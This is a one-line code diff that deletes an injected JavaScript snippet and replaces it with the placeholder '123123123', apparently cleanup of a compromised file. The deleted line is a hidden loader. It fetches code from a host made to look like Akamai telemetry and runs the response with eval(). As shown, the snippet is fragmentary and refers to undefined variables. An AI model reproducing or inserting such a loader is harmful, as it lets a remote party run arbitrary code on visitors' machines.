@@ -1,1 +1,1 @@
-(function(){var apiUrl="https://health.akamai-tech.workers.dev/Telemetry/b1aa10a9eb1559113af36f99f74179ce/Collector.php";h.open("GET",apiUrl+"?client="+n,!1),h.send(),eval(h.ResponseText)})();
+123123123
